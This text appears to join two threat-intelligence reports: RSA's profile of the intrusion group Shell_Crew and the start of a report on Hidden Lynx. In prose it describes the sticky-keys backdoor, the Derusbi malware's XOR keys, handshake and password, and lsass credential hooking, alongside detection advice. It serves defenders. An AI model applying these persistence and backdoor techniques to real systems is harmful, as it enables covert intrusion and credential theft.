This well - known technique that is commonly referred to as the sticky - keys backdoor is used when systems on the targeted organization have Microsoft Remote Desktop Protocol ( RDP ) enabled .
While this technique is not exclusive to Shell_Crew , the RSA IR Team has observed this group utilize the technique in several different environments .
There are two common ways that a system can be exploited using this technique .
1 .
File sethc.exe is replaced with another file ( typically cmd.exe or explorer.exe ) in one or both of these two locations : C : \Windows\system32\sethc.exe C : \Windows\system32\dllcache\sethc.exe The result of making this change on a system which has RDP enabled , is that once presented with the RDP Windows logon screen , simply pressing the SHIFT key 5 times will launch either a command shell ( cmd.exe ) , a windows explorer window ( explorer.exe ) , or whatever program was copied to replace the sethc.exe application executable .
2 .
The second technique makes a registry modification to launch a debugger anytime sethc.exe is executed and registers cmd.exe ( or any other file ) as the debugger .
So , anytime sethc.exe is invoked ( explained in the next paragraph ) , Windows automatically executes its `` debugger '' , i.e.cmd.exe .
The registry modification is shown in Figure 18 .
The result of making this change on a system which has RDP enabled , is that once presented with the RDP Windows logon screen , simply pressing the SHIFT key 5 times will launch either a command shell , cmd.exe as shown in Figure 18 , or whichever program has been set as the debug program in the registry .
The process runs under the context of the SYSTEM account .
Since this technique does not involve any malicious files , there is limited capability for AV vendors to detect this backdoor .
Figure 19 shows an example of a system that has the Stick Key set to present a command shell when invoked .
Shell_Crew uses a variety of malicious Trojans and tools to entrench themselves , move laterally , and persist within a targeted environment .
This portion of the report will detail the malicious files and secondary tools identified during recent engagements involving Shell_Crew .
The sections are broken up as follows :  Malicious Files and Secondary Tools Hash List ;  Malicious Files – Technical Analysis ; and  Secondary Tools – Technical Analysis The following list of Trojans and tools have been used by Shell_Crew during various investigations conducted by the RSA IR team .
The Web shells that are often used by Shell_Crew can be easily modified for specific missions or victims , and subsequently , hash values are not listed for those files .
Additionally , many Web shell samples identified reference specific victim names , which once redacted , would change the hash value of the file .
Shell_Crew uses a variety of malicious Trojans and tools to entrench themselves in a customer environment , however they consistently employ Trojans such as Trojan . Derusbi and variations of this Trojan family .
This portion of the report will detail the technical analysis of two of the custom variations of Trojan . Derusbi used by Shell_Crew .
The RSA IR Team has observed Shell_Crew deploy different variants of the Trojan . Derusbi family .
This Trojan family provides attackers a backdoor into the enterprise , as well as functionality to locate and decrypt passwords stored on the system by web browsers like Firefox and Internet Explorer , gather system and network information , and upload or download files .
Details of a sample found during a recent engagement involving Shell_Crew have been provided in Figure 20 .
It should be noted that the original sample contained a hard coded URL that made reference to a company name ; because of this , the hard coded IP Address was replaced and the MD5 and SHA1 hash values provided above are for the sanitized file .
This Trojan has an embedded and encoded driver file that is written to the infected system and then launched .
This driver will hook the IP , TCP , UDP , and RawIP driver files that normally run on a system .
When this particular Trojan . Derusbi variant is initially executed it checks to see if the registry key '' HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc\Security '' is present in the registry .
This registry key location is where the Trojan will store its encoded configuration data .
If the key is not present on the system , the sample will first decode the configuration data that is embedded in the Trojan found at position 0x1EC88 .
Figure 21 below shows the function responsible for decoding this embedded data with the XOR key ' 0x 76 2D F2 41 ' .
Once the configuration data has been initially decoded , it will be placed into memory and the Trojan will resolve the current machine name and append 4 characters of pseudorandom data separated by a dash `` - '' .
This null terminated string will then overwrite the first portion of data in the decoded configuration file .
The data below in Figure 22 illustrates the decoded configuration data .
The machine name string and the hard coded C2 for this sample are highlighted in yellow ( and have been changed to protect the victim ) .
This machine specific configuration data will then be encoded , using a different method , where each byte is XORed with 0x5F and then each bit of that product byte is subsequently inverted .
This encoded data will then be written to the HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Rpc\Security registry key .
Figure 23 below shows the function within the Trojan responsible for encoding this data and then writing it to the registry .
If the sample is restarted it will again check for the registry value containing the configuration data .
If this value is located , the sample will read the configuration data and then decode it using a function similar to the function that is depicted below .
Upon initial execution , the Trojan will decode , write , and launch a driver file that is embedded in the file at offset 0x19A40 .
The data shown below in Figure 24 is how the data resides in the file .
As shown in Figure 24 , the first DWORD that is highlighted in yellow is the 4 byte XOR key that is used to decode the driver file .
It should be noted that this XOR key is the same in several variants that were compiled over a year time frame .
The second DWORD highlighted in blue is the length of data to be decoded ( the size of the driver file ) 0x52 18 or 21,016 bytes decimal .
The function below in Figure 25 is responsible for decoding the driver file .
This function will call an additional function that is responsible for writing the decoded data to disk as ' C : \Windows\System32\Drivers\ { 6AB5E732-DFA9 - 4618-AF1C- F0D9DEF0E222 } .sys
' .
The Trojan will then use the API call ZwLoadDriver to start the newly created file .
The driver will hook other networking drivers and will determine if incoming traffic contains certain patterns of traffic , which when specific conditions are met will pipe that traffic to Trojan . Derusbi .
Once the Trojan begins to communicate with the hard coded C2 , it will initially transmit the following POST request shown in Figure 26 .
If no response is received it will transmit the following binary data shown in Figure 27 , which is part of a proprietary handshake that is discussed more in the Trojan . Derusbi – Server Variant section .
The Binary data contains a set of three DWORDs that the C2 will validate to as part of the initial portion of the handshake .
The first DWORD is created just prior to the beaconing activity .
The following two DWORDs are mathematical modifications of the first DWORD .
As illustrated below in Figure 28 , the second DWORD is the product of XORing the first DWORD with 0xFF .
The third DWORD is the product of rotating the first DWORD value right by 7 .
If the Trojan does not receive the other necessary portions of the Trojan / C2 handshake it will transmit the following type of GET request .
The ' loginid ' that is highlighted in yellow in Figure 29 is created pseudorandomly .
This Trojan has several advanced capabilities including providing a reverse shell to the adversary , locating and decrypting usernames and passwords stored by web browsers like Internet Explorer and Firefox , uploading and downloading files , and executing additional malicious files .
Appendix 1 of this report illustrates how several variants of Trojan . Derusbi have overlapping characteristics .
Having the ability to quickly detect relationships between different variants allows the RSA IR Team to locate not just specific samples , but variants throughout an environment within the same family .
Shell_crew deployed this variant of Trojan . Derusbi on perimeter devices in a victim 's network .
This variant contains a driver that monitors all incoming TCP connections for a secret handshake .
The handshake is simple enough to allow this variant to function even on busy web servers .
Once the handshake is received , the driver then passes control to the DLL file which contains the main functionality of the Trojan .
Characteristics of one such Trojan . Derusbi server variant can be found in Figure 30 .
The Trojan exports the functions shown in Table 2 below .
The adversary installed this Trojan by utilizing the regsvr32.exe utility , which calls the DllRegisterServer function .
This Trojan first checks the version of Windows it is running on using the GetVersionExA function , and will terminate if not on a Windows version 5.2 as shown in Figure 31 .
This versions of Windows this covers is :  Windows 2003 Server ;  Windows 2003 Server R2 ; and  Windows XP 64-bit Edition .
The Trojan then validates that it is not running on a 64-bit system by using the IsWow64Process function .
The servers where this Trojan was found during the engagement were Windows 2003 servers , confirming the Shell_Crew had created this variant of the Trojan . Derusbi to run specifically on this family of Operating Systems .
The Trojan then makes a copy of itself into the C : \Windows\System32 folder as a file named : `` msusbXXX.hlp '' , where XXX were found to be three characters picked randomly from this set of characters : abcdefghijklmnopqrstuvwxyz .
The Trojan then entrenches itself as a service named `` wuauserv '' as illustrated in Figure 32 .
Furthermore , this Trojan also drops a driver file on the system named : { 93144EB0 - 8E3E-4591-B307 - 8EEBFE7DB28F } .sys
.
This driver file is embedded into the DLL starting at file - offset 0x9290 .
The contents of this file are obfuscated with a 4-byte XOR key : 0xF35D882E .
Once the driver file is loaded in memory , the file is deleted from the file system .
The following registry key remains as an artifact : HKLM\SYSTEM\CURRENTCONTROLSET\ENUM\ROOT\LEGACY _ { 93144EB0 - 8E3E-4591-B307 - 8EEBFE7DB28F } .
The driver also attaches to the following network devices :  \Driver\Tcpip\Device\Ip ;  \Driver\Tcpip\Device\Tcp ;  \Driver\Tcpip\Device\Udp ; and  \Driver\Tcpip\Device\RawIp .
The driver can then monitor traffic to any existing listening TCP ports .
The driver performs the following three checks on any new TCP connections :  Ensures the payload of the first packet equals 64 bytes ;  Ensures 2nd DWORD = Inverted 1st DWORD ( i.e .
logical NOT , or XOR 0xFF ) ; and  Ensures 1st DWORD ROR 7 = 3rd DWORD .
All the data in the handshake is randomly generated .
Other than the first three DWORDS ( 12 bytes ) , the rest of the data in the 64-byte handshake is irrelevant .
The structure of the handshake is shown below in Figure 34 : The malicious DLL performs the last two checks on the handshake data as well .
It then replies back with the same type of handshake .
All data is randomly generated independent of what data was received .
Figure 35 depicts a sample handshake .
The handshake is followed by a password verification step .
The structure of the data also changes from this point forward .
This sample uses password , `` pinkcomein '' .
The client Trojan service sends the password after obfuscating it with a 4-byte XOR key , which is dynamically generated and sent with the rest of the data .
The checksum is a simple addition of all the bytes prior to the obfuscation step .
Once the password has been confirmed , the communication protocol adds one additional component .
All data beyond the 3 headers is compressed using the LZO fast compression algorithm , prior to being obfuscated with the 4-byte XOR key .
The commands sent to the server also need to be compressed and obfuscated .
Figure 37 shows an example that demonstrates all these components of the communication protocol ( XOR key in this example was set to 0x00000000 to expose the next layer for demonstration purposes ) .
The commands are in binary form .
In the example shown in Figure 37 , the command is 0x10 ( which is visible even though the data is compressed ) , uninstalls the Trojan , and restores the original registry keys .
The rest of the functionality of this Trojan is typical to this family of Trojans including ; file traversal , process start / terminate , upload / download , time stomping , and self - updates .
This section contains the technical analysis of several secondary tools that are favored by Shell_Crew .
The secondary tools are programs that facilitate lateral movement , harvesting of credentials , or allow for additional channels of communication .
During recent engagements involving Shell_Crew , the secondary tools were introduced into the environment during the early stages of a compromise indicating that these are the preferred tools of this group .
Shell_Crew also employs several additional tools that are commonly used by other threat groups and will not be covered in this report .
One of the preferred tools used by Shell_Crew during a recent incident was a multi - purpose tool typically named ' notepad.exe ' , but also found named ' inetinfo.exe ' or ' mszip.exe ' .
The collected sample of this tool was written in .NET
2.0 and the code was obfuscated using the post - development recompilation system `` Dotfuscator '' .
This tool does not have a built - in C2 address , however the code does support this feature .
This tool requires arguments to be passed to it in order to perform activities .
One of the most commonly used commands by the adversary was the proxy like functionality of this tool as show below in Figure 38 .
In this example , the proxy functionality of notepad.exe allowed the adversary to proxy their traffic to the external site '' upload.msdnblog.com '' through internal IP address 10.192.59.10 on port 80 .
In order to decompile notepad.exe , the code was deobfuscated using a publicly available tool called `` de4dot '' .
Once the code had been deobfuscated , notepad.exe could be decompiled for analysis using the tool `` Reflector '' .
The RSA IR team was able to review the functionality of this tool and a complete list of the available parameters is provided in Table 3 .
During testing it was found that when this file was executed with no arguments , the tool performs the following actions : 1 .
The tool would hash the string `` alice'srabbithole '' ( MD5 : 75BAA77C842BE168B0F66C42C7885997 ) 2 .
The tool then checks if the resource shown in Figure 40 starts with the hash value obtained in step 1 ( in this case there is a match ) .
3 .
If the result of step 2 is true , the Trojan exits without doing anything else .
It is in this resource that the Trojan would otherwise find an IP address and port number to connect .
The resource would have the format shown in Figure 41 : The first two bytes of the resource will be a hexadecimal value representing the length of the Base64 encoded data that follows .
The obfuscated data is first Base64 decoded , then XOR - ed with 0xAA .
The obfuscated data is meant to be an IP address followed by a port number , separated by a colon `` : '' .
The following figure shows the functions from the code .
This tool can be executed in various ways depending on the arguments provided .
Table 3 shows a complete this of the discovered parameters .
On a compromised Windows system , credentials can be harvested in a variety of ways :  Hash Dumping  Keystroke logging  MSGINA man - in - the middle  Hooking Authentication Functions One such example that was observed during a recent engagement was a DLL file that Shell_Crew had injected into the lsass.exe process of a server to harvest credentials .
The characteristics of this DLL file are shown in Figure 43 .
Once this DLL is injected into the lsass.exe process , it hooks the LsaApLogonUserEx2 function of msv1_0.dll .
This function is called during various authentication situations such as interactive or network logons , including when the RunAs option is used .
All credentials are saved in plaintext under : c : \windows\system32\desktop.ini .
A sample of harvested credentials that would be stored in the desktop.ini file is shown in Figure 44 .
The below sections outline information and detection capabilities that can assist with identification of activity or tools associated with Shell_Crew .
Additionally , the RSA IR Team has included a digital appendix along with this report that contains content that can be integrated into Security Analytics , the Enterprise Compromise Assessment Tool ( ECAT ) , or other security tools for rapid detection and visibility of indicators associated with Shell_Crew within an enterprise environment .
 On multiple cases Shell_Crew has been seen breaching a network by exploiting vulnerable applications on external facing servers .
Web server logs , if available , can reveal the intrusion vector .
 Shell_Crew has a preference for storing files in the C : \Recycler folder , or in other standard folders one level deep from the root , such as the C : \Dell , c : \i386 , or C : \Reboot folders .
Sometimes tools or Trojans have also been found at the root of the C : drive .
 In addition to connecting to remote systems , copying files , and scheduling jobs to execute them , Shell_Crew has a preference for lateral movement using RDP .
Additionally , they ' ve used the Sysinternals tool psexec.exe to execute a file remotely , sometimes automated via a VBS script .
 Performing forensic analysis on a compromised system 's registry hive ( focusing on the Application Compatibility Cache ) can yield numerous artifacts related to Shell_Crew 's activity .
 Using a tool like ECAT , metadata about malicious files and code can be rapidly located throughout an enterprise allowing responders to focus on relevant systems .
Host based signatures can be used in conjunction with this methodology to allow for improved efficiency .
The Yara signatures listed below are currently used by the RSA IR Team to locate some malicious files specific to this group .
A tool like ECAT can utilize these signatures to scan memory of systems across a network .
 If the adversary registers any Dlls with IIS , these should be unregistered when they are removed from the compromised system .
Similarly any altered files , like System.web.dll , should be deleted and replaced with a clean copy of the original Microsoft file .
 Data theft by Shell_Crew typically involves use of the WinRAR utility using encrypted and password protected rar files .
Here are some password seen used by Shell_Crew : - www.google.com - www.google.com ! 123 - fuckalnt76yiuudg While standard network signatures will detect some of the Trojans and tools used by Shell_Crew , the Trojan . Derusbi samples detailed in this report were designed to avoid detection by employing a proprietary handshake derived from pseudorandom values dynamically calculated at runtime .
The digital appendix provided with this report contains several Security Analytics parsers that can assist in the detection of these Trojan . Derusbi handshakes and additional variants related to these samples .
Once enabled , these parsers will generate meta entitled `` derusbiserver_handshake '' or '' derusbi_variant '' in the Risk . Warning category within Security Analytics .
Also included within the digital appendix are feeds that can be imported into Security Analytics for detection of potential Shell_Crew activity .
These feeds will alert users if there are any machines on the network communicating with malicious IP Addresses or URLs linked to Shell_Crew identified domains or IP 's within this report .
Once enabled , these feeds will generate meta entitled `` derusbi_domain_sep201 '' 3 or `` derusbi_ip_sep2013 '' in the Risk . Warning category within Security Analytics .
The hashes that are referenced in the Malicious Files and Tools section of this report are also available in the digital appendix .
The format of the files in the digital appendix can be imported directly into ECAT to begin looking for the hashes across systems within the environment .
By default , ECAT is also able to detect some of the malicious behavior that is exhibited by the samples detailed in this report .
The below examples are provided to demonstrate how potential Shell_Crew activity can be identified using standard analysis capabilities via the ECAT Server .
Figure 45 is a screenshot where ECAT detected a suspicious outbound connection .
The screen shot depicts the attempted connections of the Trojan . Derusbi sample that was detailed earlier in this report .
With this information , ECAT can be used to quickly determine if any other systems on the network had executable files that were actively beaconing to the same location .
The same malicious file seen above was also flagged as suspicious by ECAT because it was entrenched in an ' autorun ' location within the system 's registry .
The screen shot in Figure 46 below depicts the alert provided by ECAT .
Additionally , the RSA IR Team observed that Shell_Crew will time stomp ( alter a files Created Date and Time Stamp ) to hinder forensic analysis .
By default , ECAT has the ability to parse a system 's MFT and display both the File Name Attribute information and Standard Information Attribute for a file .
The screen shot below shows an instance where the files had been time stomped .
The files were purportedly created on the compromised systems in 2005 , when in actuality they had been placed on the systems in 2012 .
The RSA IR Team uses Yara Signatures like the ones provided in the digital appendix to detect malicious files present on systems and running in memory .
They 're also used to detect new variants that are being tested by adversaries using open source tools like VirusTotal .
The RSA IR Team has observed that Shell_Crew will submit numerous samples of a Trojan family to VirusTotal in an attempt to determine which AV vendors will detect the malicious files .
Shell_Crew will make small changes to the code and how the binary is compiled until a particular AV vendor does not detect the sample .
Detecting these variants using Yara Signatures allows the RSA IR Team to update and alter signatures , analyze new variants , and become aware of new C2 nodes before the samples are used against targeted organizations .
This information is then added to existing content in Security Analytics and ECAT .
Figure 48 is a graph that depicts where variants of a sample were submitted numerous times , each time being detected by different AV products .
All hashes , IP Addresses , and domains discussed within this report as associated with Shell_Crew can be found in the attached Digital Appendix .
This report detailed techniques and tools that are frequently used by an advanced adversary being referred to by the RSA IR Team as Shell_Crew .
The information delivered in this report was provided so organizations can turn the data into actionable intelligence , for detection or prevention of this advanced threat .
As of the date of this report , Shell_Crew continues to be a formidable threat group that is actively attacking organizations .
In instances where Shell_Crew has already breached an organization , the RSA IR Team has observed that the adversary will aggressively attempt to regain a foothold once their Trojans have been eradicated and communication channels severed .
If any of their existing backdoors or Web shells remain active in the environment , Shell_Crew will begin to redeploy other tiers of malware that communicate through different channels , which may use different protocols and obfuscation techniques .
The RSA IR Team has observed instances where Shell_Crew has persisted in enterprises for years before they are detected .
During that time , Shell_Crew updated or replaced existing malicious backdoors , continued to map the enterprise while installing Web shells or poisoning existing web pages , and performed internal reconnaissance of victims to determine what AV and security products are being deployed in these environments .
These tenacious approaches make it difficult for an under resourced internal security team to detect , and furthermore , eradicate this adversary .
The RSA IR Team will continue to track the TTPs used by this group and distribute information about this and other adversaries .
The information that is provided in the digital appendix and throughout the report can be ingested directly into RSA products or used agnostically with other products .
If you have any questions about this emerging threat profile or the RSA Incident Response Team , please send an email to FirstResponse @ rsa.com or contact your RSA Account Representative .
Page 37 The below images illustrate the different relationships between the Trojan . Derusbi samples that were listed in the Malicious Files Section .
The XOR keys in blue , were used to decode the Configuration data that is used by the sample .
The XOR keys in red were used to decode the embedded driver files .
The illustration below shows relationships between the Trojan . Notepad samples that were listed in the Malicious Files / Tools Section .
These samples are grouped by file description .
Below is a list of the files and folders contained within the ShellCrew_Digital_Appendix .
All content should be tested before rd full integration into SA , ECAT , or 3 party tools to prevent any adverse effects from unknown environmental variables .
ShellCrew_Digital_Appendix.zip File Hash : 4e324ffae9ce8688bdb2f569274dff7c ShellCrew_Digital_Appendix.zip Contents :  ECAT_Blacklist ( Folder containing ECAT Hash Import ) o Derusbi_Notepad.xml  feeds folder ( Folder containing SA feeds , Shell_Crew Domains and IPs ) o Derusbi_Domain.feed o Derusbi_Domain.csv ( List of Shell_Crew Domains ) o derusbi_domain.xml o Derusbi_IP.feed o Derusbi_IP.txt ( List of Shell_Crew IPs ) o derusbi_ip.xml  parsers folder ( Folder containing SA parsers ) o derusbi_server.lua ( Parser for Derusbi Handshake ) o derusbi_variant.parser ( Parser for Derusbi variant beaconing )  ShellCrewHashset.md5 file ( List of Shell_Crew File / Tool Hashes )  yara folder ( Folder containing Yara sigs ) o Shell_Crew.yara For any questions or issues deploying the Security Analytics or ECAT content into your environment , please contact RSA Support .
The Hidden Lynx group is a professional team of attackers with advanced capabilities .
They were responsible for the compromise of security firm Bit9 's digital code - signing certificate which was used to sign malware .
The Bit9 breach was part of the much larger VOHO campaign and that campaign was just one of many operations undertaken by the group over the last four years .
The group likely offers a `` hackers for hire '' operation and is tasked with retrieving specific information from a wide range of corporate and government targets .
They are a highly efficient team who can undertake multiple campaigns at once , breach some of the world 's best - protected organizations and can change their tactics quickly to achieve their goal .
They usually attack using multiple customized Trojans designed for specific purposes .
Backdoor . Moudoor is used for larger campaigns and has seen widespread distribution while Trojan . Naid is reserved for special operations against high value targets .
The group uses cutting - edge attack techniques which makes this team stand out from other major attack groups .
This paper takes an in - depth look at the Hidden Lynx group , their targets and their motivations .
It will look into their capabilities and attack strategies through their attack campaigns including the Bit9 incident .
A well - known group with affiliations to `` Operation Aurora '' managed to break into Bit9 's network using an SQL injection attack .
In February 2013 , Bit9 released a statement revealing that in July 2012 , their network had been compromised by a malicious third - party .
A well - known group named Hidden Lynx with affiliations to `` Operation Aurora '' managed to break into Bit9 's network using an SQL injection attack .
These Trojans made their way into the defense industrial sector .
However , the Bit9 compromise was only a small piece of a much larger watering - hole operation known as the VOHO campaign , which impacted hundreds of organizations in the United States .
Further , the VOHO campaign itself was just one campaign of many that is attributable to this incredibly prolific group .
Each campaign is designed to access information in governmental and commercial organizations that tend to operate in the wealthiest and most technologically advanced countries in the world .
The Hidden Lynx group has been in operation since at least 2009 and is most likely a professional organization that offers a `` hackers for hire '' service .
They have the capability to attack many organizations with concurrently running campaigns .
They operate efficiently and move quickly and methodically .
Based on these factors , the Hidden Lynx group would need to be a sizeable organization made up of between 50 and 100 individuals .
The members of this group are experts at breaching systems .
They engage in a two - pronged strategy of mass exploitation and pay - to - order targeted attacks for intellectual property using two Trojans designed specifically for each purpose : • Team Moudoor distributes Backdoor . Moudoor , a customized version of `` Gh0st RAT '' , for large - scale campaigns across several industries .
The distribution of Moudoor requires a sizeable number of people to both breach targets and retrieve the information from the compromised networks .
• Team Naid distributes Trojan . Naid , the Trojan found during the Bit9 incident , which appears to be reserved for more limited attacks against high value targets .
This Trojan was leveraged for a special operation during the VOHO campaign and is probably used by a specific team of highly skilled attackers within the group .
This Trojan was also found as part of `` Operation Aurora '' in 2009 .
Much of the attack infrastructure and tools used during these campaigns originate from network infrastructure in China .
The Hidden Lynx group makes regular use of zero - day exploits and has the ability to rework and customize exploits quickly .
They are methodical in their approach and they display a skillset far in advance of some other attack groups also operating in that region , such as the Comment Crew ( also known as APT1 ) .
The Hidden Lynx group is an advanced persistent threat that has been in operation for at least four years and is breaking into some of the best - protected organizations in the world .
With a zero - day attack already under their belt in 2013 , they continue to operate at the leading edge of targeted attacks .
The diverse set of targets from a variety of sectors would indicate that this group is not focused on any one specific task .
Since November 2011 , hundreds of organizations worldwide have been targeted by the Hidden Lynx group .
These organizations have remained relatively consistent during this time period .
The group targets organizations operating in both the commercial sector and within all levels of government .
The diverse set of targets from a variety of sectors would indicate that this group is not focused on any one specific task .
The group manages concurrent campaigns in attacks that are global in nature .
The Hidden Lynx group has most recently conducted attacks against specific organizations in South Korea and has a long history of attacking the defense industrial sector of Western countries .
The top 10 organizations categorized by the verticals they belong to are shown in Figure 1 .
The most targeted countries / regions are shown in Figure 2 .
This broad range of targeted information would indicate that the attackers are part of a professional organization .
They are likely tasked with obtaining very specific information that could be used to gain competitive advantages at both a corporate and nation state level .
It is unlikely that this organization engages in processing or using the stolen information for direct financial gain .
Their mode of operation would suggest that they may be a private organization of `` hackers for hire '' , who are highly skilled , experienced professionals whose services are available for those willing to pay .
The financial services sector has been identified as the most heavily targeted industry overall .
There is a tendency to target specific companies within this sector .
Investment banks and asset management agencies account for the majority of organizations targeted within this industry .
The absence of certain types of financial institutions , such as those operating as commercial banks , clearly indicates that the attacks are focusing on specific areas .
The organizations involved would have expertise in large corporate deals , such as confidential information on upcoming mergers and acquisitions , which could be used to gain a competitive edge .
Targeting this sector in such a concentrated fashion could provide invaluable information when negotiating large takeovers or trading shares on the stock exchange .
Attacks on the financial sector are not limited to investment banks .
Stock trading firms and one of the world 's largest stock exchanges have been subjected to attacks from this group .
The Hidden Lynx group has also undertaken indirect attacks through the supply chains .
Organizations that supply hardware , secure network communications and services specific to the financial sector have also come under attack .
There is almost certainly a financial motivation behind these attacks .
In attacks that have targeted all levels of government from local to national level , this group has repeatedly attempted to infiltrate these networks .
Attacks against government contractors and , more specifically , the defense industry indicate that the group is in pursuit of confidential information and suggests that the group had been working for nation states .
Targeting advanced technologies in specific areas such as aerospace would be useful in order to close technological gaps or gain knowledge of the advanced capabilities of other nation states .
Attacks on organizations that operate in the Internet services space can provide a wealth of valuable information .
The group had affiliations to `` Operation Aurora '' ( See appendix for more details ) , a campaign that targeted a number of organizations including software manufacturers and defense contractors .
More recently , Microsoft claimed that the target was databases containing emails marked for court order wiretaps .
They believe that these attacks were counter - intelligence operations , activities that would provide benefits at a nation state level .
The group 's tools , tactics and procedures are innovative and typically cutting - edge .
They use custom tools and techniques that they tailor to meet their objectives and maximize their chance of success .
They attack public- facing infrastructure and have been observed installing highly customized Trojans that are purpose - built for stealth .
They engineered one of the most successful watering - hole attacks to - date .
They also undertake spear- phishing attacks and hack supply chains in order to distribute their custom Trojans .
This is an established team with years of experience .
They are well resourced and highly skilled .
The Hidden Lynx group 's advanced capabilities are clearly demonstrated in three major campaigns .
In the VOHO campaign , they showed how they could subvert Bit9 's established trust models .
In the FINSHO campaign , they managed to get advanced knowledge of a zero - day exploit and in the SCADEF operation , they undertook supply chain attacks to succeed in their campaign .
The team can adapt rapidly to counter - measures that would otherwise hinder the success of a campaign .
The attack on Bit9 showed how the group could bypass solid trust protection models to get to their targets .
However , this attack was only a small part of the larger VOHO campaign , where the group proved how quickly they can adapt and change their tactics in the face of new and unforeseen obstacles .
Bit9 is a security company headquartered in Waltham , Massachusetts .
As an alternative to traditional signature - based antivirus solutions , Bit9 offers a trust - based security platform that runs off of a cloud - based reputation service combined with policy - driven application control and whitelisting to protect against cyberthreats .
As a result , it is difficult for a malicious third - party to install an untrusted application , such as a remote access Trojan ( RAT ) , onto a system that is adequately protected with the Bit9 platform .
Undaunted by this , the elite Hidden Lynx group took up the challenge .
On February 8 2013 , Bit9 released details revealing that a malicious third - party had gained access to one of their digital code - signing certificates .
During this incident , a number of Trojans and malicious scripts were signed .
In a follow up post on February 25 , more details of the attack emerged .
In July 2012 , more than six months earlier , a malicious third - party gained access to their network using an SQL injection attack .
Due to an operational oversight , a public - facing server that was n't protected with the Bit9 platform allowed the attackers to gain unauthorized access .
The attackers installed Backdoor . Hikit , a Trojan that provides extremely stealthy remote access to compromised systems .
This highly customized Trojan is typically installed onto servers in the victims ' DMZ , which was the case at Bit9 .
Credentials for another virtual machine were then stolen .
These were used Bit9 's digital code - signing certificates .
The attackers used this code - signing infrastructure to sign thirty - two malicious files .
Symantec telemetry shows some of these files have been present within select organizations in the United States defense industrial sector .
The signing of these files is significant , since they could then be used to circumvent the trust protection model offered by the Bit9 platform .
The Trojans signed include variants of Backdoor . Hikit ( the remote access Trojan used in the initial compromise ) and another RAT called Trojan . Naid .
Some malicious attack scripts were also signed .
Each Trojan has a specific purpose .
Backdoor . Hikit was used to target public - facing infrastructure while Trojan .
Naid was used to perform highly targeted attacks through email and watering - holes .
Bit9 was alerted to the compromise in January 2013 and took immediate containment steps such as revoking the digital signature and reaching out to their entire customer .
According to Bit9 , the attacks that followed were not financially motivated , but rather were an attempt to access information .
On Bit9 's own admission , three customers were impacted .
In conjunction with the Bit9 compromise , the Hidden Lynx group had another significant campaign well under way .
They had just concluded phase one of the VOHO campaign , a watering - hole operation orchestrated to attack organizations in the Boston , Massachusetts area – it was a likely a distribution vector for the newly signed files .
The VOHO campaign , first publicized by RSA , is one of the largest and most successful watering - hole attacks to date .
The campaign combined both regional and industry - specific attacks and predominantly targeted organizations that operate in the United States .
In a rapidly spreading two - phase attack , which started on June 25 and finished July 18 , nearly 4,000 machines had downloaded a malicious payload .
These payloads were being delivered to unsuspecting victims from legitimate websites that were strategically compromised .
This watering - hole infection technique was quite innovative at the time .
In a watering - hole attack , the attacker compromises a legitimate website that the target uses and trusts .
The attacker then lies in wait for the target to visit the compromised site in order to infect them .
The scale and targeted nature of the VOHO campaign set it apart from watering - hole attacks observed in the past .
The group first adopted this technique in December 2011 when an exploit or the Oracle Java SE Rhino Script Engine Remote Code Execution Vulnerability ( CVE-2011 - 3544 ) was leveraged to distribute their payloads .
As a result of their success , many other strategic compromises have been adopted by other attack groups , as seen in a notable attack targeting iOS developers earlier in 2013 which impacted employees at Facebook , Apple and Twitter .
In the VOHO campaign , ten legitimate websites were strategically compromised .
The attackers carefully selected these websites based on the likelihood that the intended target ( s ) would visit them during the exploit delivery phase .
The attackers likely pre - determined who visited the watering - hole in advance of the distribution phase of attack .
This could easily be achieved by examining the access logs of compromised Web servers .
The categories of websites compromised were both regional and industry - specific in nature and targeted the following key areas illustrated in Figure 5 .
The VOHO watering - hole distributed remote access Trojans in two phases .
In phase one of the attack , an Internet Explorer zero - day vulnerability , the Microsoft XML Core Services CVE-2012 - 1889 Remote Code Execution Vulnerability ( CVE-2012 - 1889 ) , was leveraged .
On July 10 , Microsoft introduced the patch for CVE-2012 - 1889 and activity at the watering - hole ceased .
This appears to have been a clever decision on behalf of the attackers .
If they continued to deliver the exploit , they risked detection and would have hurt their chances of retaining access to the watering - hole for phase two of the campaign .
Within six days , phase two of the distribution began , this time using a malicious Java applet exploiting the Oracle Java SE CVE-2012 - 1723 Remote Code Execution Vulnerability ( CVE-2012 - 1723 ) .
This Java exploit was patched at the time .
Having already used two zero - day exploits in quick succession ( the first zero - day exploit was used in the GOTHAM campaign in May 2012 , see appendix for more details ) , the Hidden Lynx group may not have had another one at their disposal .
The timeline of activity at the watering - hole is shown in Figure 6 .
In each phase of the attack , two Trojans were being distributed at different intervals .
The customized version of `` Gh0st RAT '' , Backdoor . Moudoor , saw large - scale distribution in comparison to Trojan . Naid , which was used more selectively in these attacks .
Before being used in the second phase of the attack , Trojan . Naid was signed with the Bit9 certificate .
Moudoor was never observed during the attack on Bit9 , which could indicate that two separate teams are at work here .
With Moudoor and Naid using different command - and - control ( C & C ) servers , each team could work independently on alternative objectives .
The discovery of the Naid C & C would also be less likely in comparison to Moudoor 's , as its large - scale distribution would inevitably create more noise as it continued to impact many organizations .
During this campaign , Team Naid had a very specific objective – to gain access to information from organizations operating in the defense industrial sector .
An unsigned version of Naid was distributed to select victims within the defense industrial sector during phase one until Microsoft supplied a patch for CVE-2012 - 1889 on July 10 .
It may have been during this phase of the attack when the team realized the information they sought was held by organizations protected by Bit9 .
As the team found it difficult to compromise Bit9-protected computers and had no viable exploit for distribution , their immediate objective focused on Bit9 's digital code - signing certificate .
By July 13 , just a few days after they started their attacks on Bit9 , they obtained the Bit9-signed Naid .
By the next day , they had built a viable Java exploit to distribute their Trojan .
Armed with the newly - signed Trojan and delivery vehicle , the group resumed malicious activity at the watering - hole for three days from July 16 .
It was during this period that three organizations protected with the Bit9 platform were successfully compromised .
In this campaign , Naid was specifically reserved for special operations against high value targets .
Team Naid 's objective was narrow and focused and the team aimed to limit Naid 's exposure .
The sophistication of the overall attack is typical of attackers with a very high pedigree .
The team is clearly highly skilled ; they operate methodically and can switch objectives at a moment 's notice .
They rapidly adapted to external factors that were hindering their specific objective and pursued a difficult prize - the Bit9 certificate - in order to achieve their overall goal .
The distribution of Moudoor during this campaign was on a much larger scale .
Organizations operating in the financial sector , all levels of government ( local and federal ) , healthcare , education and law were impacted during this campaign .
There is a wealth of sensitive information within these organizations which would be of interest to both nation states and entities that would benefit from information as a result of corporate espionage attacks .
The top distinct infections per organization type are shown in Figure 8 .
